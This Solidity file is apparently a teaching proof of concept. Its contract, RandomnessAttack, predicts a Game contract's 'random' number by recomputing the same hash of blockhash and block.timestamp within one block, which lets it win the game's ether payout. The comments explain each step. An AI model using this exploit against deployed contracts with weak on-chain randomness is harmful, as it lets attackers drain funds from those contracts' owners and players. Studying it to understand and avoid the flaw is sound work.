//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Game.sol";

/**
 * @notice The hacker calls the attack function from this contract.
 * attack further guesses the number using the same method as Game.sol which is uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)))
 * Attacker is able to guess the same number because blockhash and block.timestamp is public information and everybody has access to it
 * The attacker then calls the guess function from Game.sol
 * guess first calls the pickACard function which generates the same number using uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)))
 * because pickACard and attack were both called in the same block.
 * guess compares the numbers and they turn out to be the same.
 * guess then sends the Attack.sol 0.1 ether and the game ends
 * Attacker is successfully able to guess the random number
 */
contract RandomnessAttack {
    Game game;

    /**
     * @notice  Creates an instance of Game contract with the help of `gameAddress`
     */
    constructor(address _gameAddress) {
        game = Game(_gameAddress);
    }

    /**
     * @notice  attacks the `Game` contract by guessing the exact number because `blockhash` and `block.timestamp`
     *  is accessible publically
     */
    function attack() public {
        // `abi.encodePacked` takes in the two params - `blockhash` and `block.timestamp`
        // and returns a byte array which further gets passed into keccak256 which returns `bytes32`
        // which is further converted to a `uint`.
        // keccak256 is a hashing function which takes in a bytes array and converts it into a bytes32
        uint256 _guess = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number), block.timestamp)
            )
        );
        game.guess(_guess);
    }

    ///@notice Gets called when the contract recieves ether
    receive() external payable {}
}
